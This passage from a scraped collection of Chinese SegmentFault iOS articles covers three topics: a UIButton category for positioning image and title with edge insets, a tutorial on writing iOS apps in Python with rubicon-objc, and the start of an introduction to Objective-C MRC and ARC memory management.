                                     -(selfHeight - padding - titleRect.origin.y - titleRect.size.height),
                                     -(selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(0,
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     0,
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));
</code></pre>
<h2>七、图片保持居中，而文字水平居中并且在图片的上面</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316502"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片保持居中，而文字水平居中并且在图片的上面"" title=""图片保持居中，而文字水平居中并且在图片的上面""></span><br> 这种方式要求图片在按钮居中，而文字则要求左右居中并且在垂直在图片的上面并保留出padding的间隔。 图片的偏移上面有说到，而文字的水平偏移上面也有说到，这里只说垂直偏移，文字新的底部位置等于图片的顶部位置 - <em>padding</em>  而文字老的底部位置等于<em>titleRect.size.height + titleRect.origin.y</em>, 因此两者的差值就是文字需要垂直偏移的值。代码设置为：</p>
<pre><code> 
 
  titleEdgeInsets =UIEdgeInsetsMake(-(titleRect.origin.y + titleRect.size.height - imageRect.origin.y + padding),
                                     (selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
                                     (titleRect.origin.y + titleRect.size.height - imageRect.origin.y + padding),
                                     -(selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(0,
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     0,
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));

</code></pre>
<h2>八、图片保持居中，而文字水平居中并且在图片的下面</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316503"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片保持居中，而文字水平居中并且在图片的下面"" title=""图片保持居中，而文字水平居中并且在图片的下面""></span><br>这种方式要求图片在按钮居中，而文字则要求左右居中并且垂直在图片的下面并保留出<em>padding</em>的间隔。图片的偏移上面有说到，而文字的水平偏移上面也有说到，这里只说垂直偏移，文字新的顶部位置等于<em>imageRect.origin.y + imageRect.size.height + padding</em>,  而文字老的顶部位置等于<em>titleRect.origin.y</em>，因此两者的差值就是文字需要垂直偏移的值。代码设置为：</p>
<pre><code> 
  titleEdgeInsets =UIEdgeInsetsMake((imageRect.origin.y + imageRect.size.height - titleRect.origin.y + padding),
                                     (selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2,
                                     -(imageRect.origin.y + imageRect.size.height - titleRect.origin.y + padding),
                                     -(selfWidth /2 -  titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) /2);
            
  imageEdgeInsets =UIEdgeInsetsMake(0,
                                     (selfWidth /2 - imageRect.origin.x - imageRect.size.width /2),
                                     0,
                                     -(selfWidth /2 - imageRect.origin.x - imageRect.size.width /2));

 </code></pre>
<h2>九、图片在右，文字在左，距离按钮两边边距</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316504"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在右，文字在左，距离按钮两边边距"" title=""图片在右，文字在左，距离按钮两边边距""></span></p>
<p>在这种方式中，图片和文本都是垂直居中对齐，这部分是不需要调整的，而文本的左边则需要由原来的<em>titleRect.origin.x</em>移动到左边<em>padding</em>的位置，而图片的左边则需要由原来的<em>imageRect.origin.x</em>移动到<em>selfWidth - padding - imageRect.size.width</em>位置。因此代码设置为：</p>
<pre><code>self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                        -(titleRect.origin.x - padding),
                                                        0,
                                                        (titleRect.origin.x - padding));
                
 self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth - padding - imageRect.origin.x - imageRect.size.width),
                                                        0,
                                                        -(selfWidth - padding - imageRect.origin.x - imageRect.size.width));</code></pre>
<h2>十、图片在左，文字在右，距离按钮两边边距</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000008316505"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片在左，文字在右，距离按钮两边边距"" title=""图片在左，文字在右，距离按钮两边边距""></span></p>
<p>这种方式中，图片和文字的垂直位置不需要调整，而只需要将图文的水平位置调整即可，而调整的方法和上面的相似，只是图片移到左边儿文字移到右边而已。代码设置为：</p>
<pre><code> self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth - padding - titleRect.origin.x - titleRect.size.width),
                                                        0,
                                                        -(selfWidth - padding - titleRect.origin.x - titleRect.size.width));
                
 self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        -(imageRect.origin.x - padding),
                                                        0,
                                                        (imageRect.origin.x - padding));

</code></pre>
<p>前面说的的十种图文结合样式，我想应该可以满足您的需求了，如果这些图文结合的样式还是无法满足您的需求时则您还是别用<em>UIButton</em>了。<br>为了方便大家的使用，我把上面的图文结合样式整理成了一个<em>UIButton</em>的分类方法，大家可以直接拷贝使用：</p>
<p>头文件：</p>
<pre><code>//  
//  UIButton+ImageTitleStyle.h  
//  
//  Created by 欧阳大哥 on 14-7-13.  
//  QQ：156355113
//  Github:  https://github.com/youngsoft
//  Email:  obq0387_cn@sina.com
//  
  
#import &lt;UIKit/UIKit.h&gt;  
  
/* 
 针对同时设置了Image和Title的场景时UIButton中的图片和文字的关系 
 */  
typedef NS_ENUM(NSInteger, ButtonImageTitleStyle ) {  
    ButtonImageTitleStyleDefault = 0,       //图片在左，文字在右，整体居中。  
    ButtonImageTitleStyleLeft  = 0,         //图片在左，文字在右，整体居中。  
    ButtonImageTitleStyleRight     = 2,     //图片在右，文字在左，整体居中。  
    ButtonImageTitleStyleTop  = 3,          //图片在上，文字在下，整体居中。  
    ButtonImageTitleStyleBottom    = 4,     //图片在下，文字在上，整体居中。  
    ButtonImageTitleStyleCenterTop = 5,     //图片居中，文字在上距离按钮顶部。  
    ButtonImageTitleStyleCenterBottom = 6,  //图片居中，文字在下距离按钮底部。  
    ButtonImageTitleStyleCenterUp = 7,      //图片居中，文字在图片上面。  
    ButtonImageTitleStyleCenterDown = 8,    //图片居中，文字在图片下面。  
    ButtonImageTitleStyleRightLeft = 9,     //图片在右，文字在左，距离按钮两边边距
    ButtonImageTitleStyleLeftRight = 10,    //图片在左，文字在右，距离按钮两边边距
};  
  
@interface UIButton (ImageTitleStyle)  
  
/* 
 调整按钮的文本和image的布局，前提是title和image同时存在才会调整。 
 padding是调整布局时整个按钮和图文的间隔。 
  
 */  
-(void)setButtonImageTitleStyle:(ButtonImageTitleStyle)style padding:(CGFloat)padding;  
  
@end  </code></pre>
<p>实现文件：</p>
<pre><code>//
//  UIButton+ImageTitleStyle.m
//
//  Created by 欧阳大哥 on 14-7-13.
//

#import ""UIButton+ImageTitleStyle.h""

@implementation UIButton (ImageTitleStyle)

-(void)setButtonImageTitleStyle:(ButtonImageTitleStyle)style padding:(CGFloat)padding
{
    if (self.imageView.image != nil &amp;&amp; self.titleLabel.text != nil)
    {
        
        //先还原
        self.titleEdgeInsets = UIEdgeInsetsZero;
        self.imageEdgeInsets = UIEdgeInsetsZero;
        
        CGRect imageRect = self.imageView.frame;
        CGRect titleRect = self.titleLabel.frame;
        
        CGFloat totalHeight = imageRect.size.height + padding + titleRect.size.height;
        CGFloat selfHeight = self.frame.size.height;
        CGFloat selfWidth = self.frame.size.width;
        
        switch (style) {
            case ButtonImageTitleStyleLeft:
                if (padding != 0)
                {
                    self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                            padding/2,
                                                            0,
                                                            -padding/2);
                    
                    self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                            -padding/2,
                                                            0,
                                                            padding/2);
                }
                break;
            case ButtonImageTitleStyleRight:
            {
                //图片在右，文字在左
                self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                        -(imageRect.size.width + padding/2),
                                                        0,
                                                        (imageRect.size.width + padding/2));
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (titleRect.size.width+ padding/2),
                                                        0,
                                                        -(titleRect.size.width+ padding/2));
            }
                break;
            case ButtonImageTitleStyleTop:
            {
                //图片在上，文字在下
                self.titleEdgeInsets = UIEdgeInsetsMake(((selfHeight - totalHeight)/2 + imageRect.size.height + padding - titleRect.origin.y),
                                                        (selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) / 2,
                                                        -((selfHeight - totalHeight)/2 + imageRect.size.height + padding - titleRect.origin.y),
                                                        -(selfWidth/2 - titleRect.origin.x - titleRect.size.width /2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(((selfHeight - totalHeight)/2 - imageRect.origin.y),
                                                        (selfWidth /2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        -((selfHeight - totalHeight)/2 - imageRect.origin.y),
                                                        -(selfWidth /2 - imageRect.origin.x - imageRect.size.width / 2));
                
            }
                break;
            case ButtonImageTitleStyleBottom:
            {
                //图片在下，文字在上。
                self.titleEdgeInsets = UIEdgeInsetsMake(((selfHeight - totalHeight)/2 - titleRect.origin.y),
                                                        (selfWidth/2 - titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2,
                                                        -((selfHeight - totalHeight)/2 - titleRect.origin.y),
                                                        -(selfWidth/2 - titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(((selfHeight - totalHeight)/2 + titleRect.size.height + padding - imageRect.origin.y),
                                                        (selfWidth /2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        -((selfHeight - totalHeight)/2 + titleRect.size.height + padding - imageRect.origin.y),
                                                        -(selfWidth /2 - imageRect.origin.x - imageRect.size.width / 2));
            }
                break;
            case ButtonImageTitleStyleCenterTop:
            {
                self.titleEdgeInsets = UIEdgeInsetsMake(-(titleRect.origin.y - padding),
                                                        (selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2,
                                                        (titleRect.origin.y - padding),
                                                        -(selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        0,
                                                        -(selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2));
            }
                break;
            case ButtonImageTitleStyleCenterBottom:
            {
                self.titleEdgeInsets = UIEdgeInsetsMake((selfHeight - padding - titleRect.origin.y - titleRect.size.height),
                                                        (selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2,
                                                        -(selfHeight - padding - titleRect.origin.y - titleRect.size.height),
                                                        -(selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        0,
                                                        -(selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2));
            }
                break;
            case ButtonImageTitleStyleCenterUp:
            {
                self.titleEdgeInsets = UIEdgeInsetsMake(-(titleRect.origin.y + titleRect.size.height - imageRect.origin.y + padding),
                                                        (selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2,
                                                        (titleRect.origin.y + titleRect.size.height - imageRect.origin.y + padding),
                                                        -(selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        0,
                                                        -(selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2));
            }
                break;
            case ButtonImageTitleStyleCenterDown:
            {
                self.titleEdgeInsets = UIEdgeInsetsMake((imageRect.origin.y + imageRect.size.height - titleRect.origin.y + padding),
                                                        (selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2,
                                                        -(imageRect.origin.y + imageRect.size.height - titleRect.origin.y + padding),
                                                        -(selfWidth / 2 -  titleRect.origin.x - titleRect.size.width / 2) - (selfWidth - titleRect.size.width) / 2);
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2),
                                                        0,
                                                        -(selfWidth / 2 - imageRect.origin.x - imageRect.size.width / 2));
            }
                break;
            case ButtonImageTitleStyleRightLeft:
            {
                 //图片在右，文字在左，距离按钮两边边距
                
                self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                        -(titleRect.origin.x - padding),
                                                        0,
                                                        (titleRect.origin.x - padding));
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth - padding - imageRect.origin.x - imageRect.size.width),
                                                        0,
                                                        -(selfWidth - padding - imageRect.origin.x - imageRect.size.width));
            }
                
                break;
                
            case ButtonImageTitleStyleLeftRight:
            {
                //图片在左，文字在右，距离按钮两边边距
                
                self.titleEdgeInsets = UIEdgeInsetsMake(0,
                                                        (selfWidth - padding - titleRect.origin.x - titleRect.size.width),
                                                        0,
                                                        -(selfWidth - padding - titleRect.origin.x - titleRect.size.width));
                
                self.imageEdgeInsets = UIEdgeInsetsMake(0,
                                                        -(imageRect.origin.x - padding),
                                                        0,
                                                        (imageRect.origin.x - padding));


                
            }
                break;
            default:
                break;
        }
    }
    else {
        self.titleEdgeInsets = UIEdgeInsetsMake(0, 0, 0, 0);
        self.imageEdgeInsets = UIEdgeInsetsMake(0, 0, 0, 0);
    }
    
}


@end
</code></pre>
<p>上面的方法<code>setButtonImageTitleStyle:(ButtonImageTitleStyle)style padding:(CGFloat)padding</code>请在建立完UIButton对象并且指定一个具体的frame值或者自动布局的约束尺寸后，并且调用<code>setTitle:forState:</code>和<code>setImage:forSate:</code>后再调用：</p>
<pre><code>UIButton *button = [[UIButton alloc] initWithFrame:CGRectMake(0,0,100,100)];
[button setTitle:@""测试文本"" forState:UIControlStateNormal];
[button setImage:[UIImage imageNamed:@""test""] forState:UIControlStateNormal];
[button setButtonImageTitleStyle:ButtonImageTitleStyleTop padding:10];</code></pre>
<p>另外如果你想要你的按钮中的图片和文字整体的水平居左，或者水平居右，或者垂直居上或者垂直居下则可以用UIButton的原生(UIControl)属性：</p>
<pre><code>@property(nonatomic) UIControlContentVerticalAlignment contentVerticalAlignment;     // how to position content vertically inside control. default is center
@property(nonatomic) UIControlContentHorizontalAlignment contentHorizontalAlignment; // how to position content hozontally inside control. default is center</code></pre>
<p>这两个属性来设置按钮的垂直和水平的整体位置的调整，具体设置则读者自行去实践吧。</p>

                ", iOS中UIButton实现各种图文结合的效果以及原理,1531972038,329,1,357,1,1,https://segmentfault.com/a/1190000004958454
108,1,0,6,"
                    
<p>博文地址：<a href=""http://ifujun.com/shi-yong-pythonkai-fa-ioscheng-xu/"" rel=""nofollow noreferrer"">http://ifujun.com/shi-yong-pythonkai-fa-...</a></p>
<p><strong>对，你没有看错，就是使用Python开发iOS程序！</strong></p>
<p>我们见过使用JS、Lua、Ruby开发iOS程序的，但是基本没有见过使用Python开发iOS程序（软件）的，这是为什么？关于这个问题，我后面会回答。</p>
<p>那么，怎么用Python开发iOS程序呢？其实我们最主要解决的就是下面几件事情：</p>
<ol>
<li><p>在iOS App中安装Python解释器。</p></li>
<li><p>搭建Python和objc通信的桥梁。</p></li>
<li><p>如何配置工程并开发。</p></li>
</ol>
<p>如果不使用UIKit这些，那么就要使用OpenGL ES这些了，这种方式，主要是用于开发游戏的，我们这里不涉及这些。</p>
<p><strong>当然，以下所有内容都是在一台已经安装了Xcode的Mac上进行的。</strong></p>
<h3>在iOS App中安装Python解释器</h3>
<h4>Python-iOS-support</h4>
<p><a href=""http://pybee.org/"" rel=""nofollow noreferrer"">pybee</a>开源了一个可以嵌入到iOS工程中的Python编译脚本，具体位置在这：</p>
<p><a href=""https://github.com/pybee/Python-iOS-support"" rel=""nofollow noreferrer"">https://github.com/pybee/Python-iOS-supp...</a></p>
<p>默认是使用Python 3.4.2,编译x86_64、i386、ARMv7、ARMv7s、ARM64共5个版本，然后打成一个臃肿包，可选framework或者.a。</p>
<p>如果真的要用于生产环境的话，只要把Makefile中的</p>
<pre><code>TARGETS-iOS=iphonesimulator.x86_64 iphonesimulator.i386 iphoneos.armv7 iphoneos.armv7s iphoneos.arm64
</code></pre>
<p>修改为:</p>
<pre><code>TARGETS-iOS=iphoneos.armv7 iphoneos.arm64
</code></pre>
<p>我们只需要支持ARMv7和ARM64即可，ARMv7s可以兼容ARMv7,所以可以让包小一些。</p>
<p>作者提供的已经编译好的包里面，主要有两种版本:</p>
<ul>
<li><p>Python 3.4.x</p></li>
<li><p>Python 3.5.x</p></li>
</ul>
<p>按照作者的说法，Python版本是可以更换的，但是我尝试过，我将最新版本的Python 2.7.11放进去，是无法编译成功的。</p>
<p>有一些人提到了这个<a href=""https://github.com/pybee/Python-iOS-support/issues/17"" rel=""nofollow noreferrer"">问题</a>,但是作者还是建议使用3.4.x或者3.5.x版本，2.7x版本他已经不再支持了。</p>
<p>修改Python版本的地方在:</p>
<pre><code>PYTHON_VERSION=3.4.2
</code></pre>
<p>替换为其他版本即可。</p>
<h4>编译</h4>
<p>切到<code>Python-iOS-support</code>目录，设置编译参数，直接编译。我们这只需要iOS版本，所以直接<code>make iOS</code>即可。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006774222"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>编译成功之后，会在build目录上生成<code>Python.framework</code>和<code>OpenSSL.framework</code>。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004945699"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>如果编译出问题，或者不想烦这个事情的，可以直接下载编译好的版本：</p>
<p><a href=""https://github.com/pybee/Python-iOS-support/releases"" rel=""nofollow noreferrer"">https://github.com/pybee/Python-iOS-supp...</a></p>
<h3>搭建Python和objc通信的桥梁</h3>
<p><a href=""https://github.com/pybee/rubicon-objc"" rel=""nofollow noreferrer"">rubicon-objc</a>是一个连接Python和objc的桥梁。</p>
<p>首先，我们需要安装一下：</p>
<pre><code>pip install rubicon-objc
</code></pre>
<p>那么，它有什么用呢，这就有意思了，我们来看一下它是这么写的。</p>
<p>这块的内容，前提条件是你要懂点iOS。</p>
<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-

from ctypes import cdll
from ctypes import util
from rubicon.objc import ObjCClass, objc_method
# 载入Foundation框架
cdll.LoadLibrary(util.find_library('Foundation'))
# 获取NSArray类
NSArray = ObjCClass(""NSArray"")
# 等同于 
# NSArray *myArray = [NSArray arrayWithObjects:@""ok"", @""ok1"", @""ok2"", nil]
myArray = NSArray.arrayWithObjects_(""ok"", ""ok1"", ""ok2"", None)

print myArray.count
print myArray.indexOfObject_(""ok2"")
</code></pre>
<p>输出结果是:</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004945701"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>是不是很好玩！</p>
<p>调用objc的方式和以前objc直接的写法很像，只是有一些需要改变，比如：</p>
<ul>
<li><p>方法名不使用<code>:</code>，而是使用<code>_</code>。</p></li>
<li><p>多参数需要使用Python的方式，比如objc里面的方法是:</p></li>
</ul>
<pre><code>/**objc:**
/- (BOOL)writeToURL:(NSURL *)url atomically:(BOOL)atomically;
/**Python**
/array. writeToURL_atomically_(url, atomically)    
</code></pre>
<ul>
<li><p>不能使用<code>nil</code>,Python里面使用<code>None</code>代替。</p></li>
<li><p>等等。</p></li>
</ul>
<p>具体用法大家可以自行探究一下。</p>
<h3>如何配置工程并开发</h3>
<h4>创建工程</h4>
<p>Python所需要的工程和直接用Xcode创建的不太一样，手动改写的话，还比较麻烦，所以我们直接用模板工具生成。</p>
<p><a href=""http://cookiecutter.rtfd.org/"" rel=""nofollow noreferrer"">cookiecutter</a>是一个可以在模板中快速创建工程的一个工具，<a href=""https://github.com/pybee/Python-iOS-template"" rel=""nofollow noreferrer"">Python-iOS-template</a>是<a href=""http://pybee.org/"" rel=""nofollow noreferrer"">pybee</a>开源的一个使用Python开发iOS工程的模板。</p>
<p>首先，我们需要安装<a href=""http://cookiecutter.rtfd.org/"" rel=""nofollow noreferrer"">cookiecutter</a>,直接使用<code>pip</code>安装即可：</p>
<pre><code>pip install cookiecutter
</code></pre>
<p>安装好后，直接使用<code>cookiecutter</code>命令创建工程：</p>
<pre><code>cookiecutter https://github.com/pybee/Python-iOS-template
</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004945703"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>建好的工程目录结构如下：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004945706"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><code>app</code>目录是放置我们创建的python文件的地方。<br><code>app_packages</code>目录是放三方包的地方,等同于我们在电脑端的<code>site_packages</code>文件夹。</p>
<p>工程里面可以同时存在objc文件和python文件，两者可以各自运行，并不冲突。</p>
<h4>完善工程</h4>
<blockquote><p>Talk is cheap, show me the code.</p></blockquote>
<p>不得不承认，<a href=""https://github.com/pybee/rubicon-objc"" rel=""nofollow noreferrer"">rubicon-objc</a>几乎没有文档。</p>
<p>我在github上找到一个项目，<a href=""https://github.com/clowwindy/iOS-Python-Project"" rel=""nofollow noreferrer"">iOS-Python-Project</a>。这是使用<a href=""https://github.com/pybee/rubicon-objc"" rel=""nofollow noreferrer"">rubicon-objc</a>开发的一个Python-iOS工程，但是很可惜的是，我这边运行出错。</p>
<p>我借鉴了<a href=""https://github.com/clowwindy/iOS-Python-Project"" rel=""nofollow noreferrer"">iOS-Python-Project</a>,修改了一个可以运行的工程，有兴趣的可以去下载一下。</p>
<p><strong><a href=""https://github.com/Forkong/python-iOS"" rel=""nofollow noreferrer"">https://github.com/Forkong/python-iOS</a></strong></p>
<p>工程里面并没有集成<code>Python.framework</code>和<code>OpenSSL.framework</code>,因为这两个framework太大了，clone下来的时间会很长，所以不如直接在Github上下载编译好的framework，地址在这边:</p>
<p><strong><a href=""https://github.com/pybee/Python-iOS-support/releases"" rel=""nofollow noreferrer"">https://github.com/pybee/Python-iOS-supp...</a></strong></p>
<p>下好了之后，framework一般放置于根目录下面，相对于我这个demo,那么放置的目录就是<code>python-iOS/</code>,和<code>apptest.xcodeproj</code>同级。</p>
<p>这个demo运行起来大概是这个样子:</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004945708"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>demo中只修改了rootViewController的背景，然后在上面添加了一个label。</p>
<p>当然，它还能做很多事情，怎么做，我也不知道。</p>
<p>它的文档太少了，我甚至不知道怎么才能使用<code>CGRect</code>，因为它不是一个类，我无法import进来。</p>
<h3>总结</h3>
<p>开头我提到为什么很少有人会使用Python去开发iOS程序(软件)，我个人认为主要有以下几个原因：</p>
<ol>
<li><p>IDE的支持 - 如果你已经在我的demo上写了几行，你会发现，没有任何objc库的提示。本来我们objc这门语言就是写法很长很详细的，要想直接手写出整个方法名，那真是X了?了。</p></li>
<li><p>系统库 - 一般来说，iOS程序一般至少都要有几个页面的，那么<code>UIKit</code>基本就是我们必须的，除非你想使用OpenGL ES画，或者直接HTML等。而要用到<code>UIKit</code>，肯定要写一堆是Python但是完全像objc的代码，因为那方法名就是这么定义的。这样写太累了，不如直接用objc写。</p></li>
<li><p>Python解释器过大 - 我生成的只有ARMv7和ARM64的<code>Python.framework</code>就已经有20M+了，再加上好几M的<code>OpenSSL.framework</code>，这得多大。即使打到生产包里面，我相信估计也有10M~20M了,相比较而言，lua的解释器就只有200k。</p></li>
<li><p>技术支持 - 连我们上面说到的<code>rubicon</code>都没有文档，万一出事了，找谁解决？社区上也没几个人这么干，提问的话，又有几个人可以帮助你。Ruby可以用RubyMotion来开发iOS，但是它还是有一些人用的。</p></li>
</ol>
<p>在文章最后，我只想说：</p>
<blockquote><p>虽然Python不适合开发iOS程序，但是，很好玩啊。</p></blockquote>
<p>这就够了。</p>
<p>我们给App做hotfix的时候，如果不算HTML方案的话，主要有两种，一种是lua的wax,还有一种是js的JSPatch。</p>
<p>lua写patch的时候也具有上面的1、2两个缺点，但是补丁这种东西本来就很短，稍微写点也无妨。</p>
<p>或许，你可以试试使用Python给你的App做hotfix。</p>

                ", 使用Python开发iOS程序,1531972040,266,1,903,1,1,https://segmentfault.com/a/1190000004945692
109,1,0,6,"
                    
<h2>前言</h2>
<p>有关 iOS 内存管理的文章相信大家都看过不少了，我自己也一样。不过网上大部分文章都没有解决对于内存管理的一些关键性的疑惑，对于初学者来说并不是很友好。本文旨在从初学者的角度出发，对 iOS 内存管理的关键部分进行介绍，希望能对广大 iOS 学习者有所帮助。</p>
<p>本文首发于我发起的 <a href=""https://hit-alibaba.github.io/interview/index.html"" rel=""nofollow noreferrer"">笔试面试知识整理</a> 项目，这里是对应的 <a href=""https://github.com/HIT-Alibaba/interview"" rel=""nofollow noreferrer"">Github 仓库</a>，由多人协作编辑而成。如发现有错误的地方，随时欢迎指正。</p>
<h2>Objective-C 中的内存分配</h2>
<p>在 Objective-C 中，对象通常是使用 <code>alloc</code> 方法在堆上创建的。 <code>[NSObject alloc]</code> 方法会在对堆上分配一块内存，按照<code>NSObject</code>的内部结构填充这块儿内存区域。</p>
<p>一旦对象创建完成，就不可能再移动它了。因为很可能有很多指针都指向这个对象，这些指针并没有被追踪。因此没有办法在移动对象的位置之后更新全部的这些指针。</p>
<h2>MRC 与 ARC</h2>
<p>Objective-C中提供了两种内存管理机制：MRC（MannulReference Counting）和 ARC(Automatic Reference Counting)，分别提供对内存的手动和自动管理，来满足不同的需求。现在苹果推荐使用 ARC 来进行内存管理。</p>
<h3>MRC</h3>
<h4>对象操作的四个类别</h4>
<table>
<thead><tr>
<th>对象操作</th>
<th>OC中对应的方法</th>
<th>对应的 retainCount 变化</th>
</tr></thead>
<tbody>
<tr>
<td>生成并持有对象</td>
<td>alloc/new/copy/mutableCopy等</td>
<td>+1</td>
</tr>
<tr>
<td>持有对象</td>
<td>retain</td>
<td>+1</td>
</tr>
<tr>
<td>释放对象</td>
<td>release</td>
<td>-1</td>
</tr>
<tr>
<td>废弃对象</td>
<td>dealloc</td>
<td>-</td>
</tr>
</tbody>
</table>
<p><strong>注意：</strong></p>
<ul>
<li><p>这些对象操作的方法其实并不包括在OC中，而是包含在Cocoa框架下的Foundation框架中。</p></li>
<li><p>对象的 <code>reatinCount</code> 属性并没有实际上的参考价值，参考苹果官方文档<a href=""https://developer.apple.com/library/mac/documentation/Cocoa/Conceptual/MemoryMgmt/Articles/mmPractical.html"" rel=""nofollow noreferrer"">《Practical Memory Management》</a>.</p></li>
</ul>
<h4>四个法则</h4>
<ul>
<li><p>自己生成的对象，自己持有。</p></li>
<li><p>非自己生成的对象，自己也能持有。</p></li>
<li><p>不在需要自己持有的对象的时候，释放。</p></li>
<li><p>非自己持有的对象无法释放。</p></li>
</ul>
<p>如下是四个黄金法则对应的代码示例：</p>
<pre><code class=""objectivec"">/*
 * 自己生成并持有该对象
 */
 id obj0 = [[NSObeject alloc] init];
 id obj1 = [NSObeject new];</code></pre>
<pre><code class=""objectivec"">/*
 * 持有非自己生成的对象
 */
id obj = [NSArray array]; // 非自己生成的对象，且该对象存在，但自己不持有
[obj retain]; // 自己持有对象</code></pre>
<pre><code class=""objectivec"">/*
 * 不在需要自己持有的对象的时候，释放
 */
id obj = [[NSObeject alloc] init]; // 此时持有对象
[obj release]; // 释放对象
/*
 * 指向对象的指针仍就被保留在obj这个变量中
 * 但对象已经释放，不可访问
 */</code></pre>
<pre><code class=""objectivec"">/*
 * 非自己持有的对象无法释放
 */
id obj = [NSArray array]; // 非自己生成的对象，且该对象存在，但自己不持有
[obj release]; // 此时将运行时crash 或编译器报error</code></pre>
<p>其中 <code>非自己生成的对象，且该对象存在，但自己不持有</code> 这个特性是使用<code>autorelease</code>来实现的，示例代码如下：</p>
<pre><code class=""objectivec"">- (id) getAObjNotRetain {
    id obj = [[NSObject alloc] init]; // 自己持有对象
    [obj autorelease]; // 取得的对象存在，但自己不持有该对象
    return obj;
}</code></pre>
<p><code>autorelease</code> 使得对象在超出生命周期后能正确的被释放(通过调用release方法)。在调用 <code>release</code> 后，对象会被立即释放，而调用 <code>autorelease</code> 后，对象不会被立即释放，而是注册到 <code>autoreleasepool</code> 中，经过一段时间后 <code>pool</code>结束，此时调用release方法，对象被释放。</p>
<p>在MRC的内存管理模式下，与对变量的管理相关的方法有：retain, release 和 autorelease。retain 和 release 方法操作的是引用记数，当引用记数为零时，便自动释放内存。并且可以用 NSAutoreleasePool 对象，对加入自动释放池（autorelease 调用）的变量进行管理，当 drain 时回收内存。</p>
<h3>ARC</h3>
<p>ARC 是苹果引入的一种自动内存管理机制，会根据引用计数自动监视对象的生存周期，实现方式是在编译时期自动在已有代码中插入合适的内存管理代码以及在 Runtime 做一些优化。</p>
<h4>变量标识符</h4>
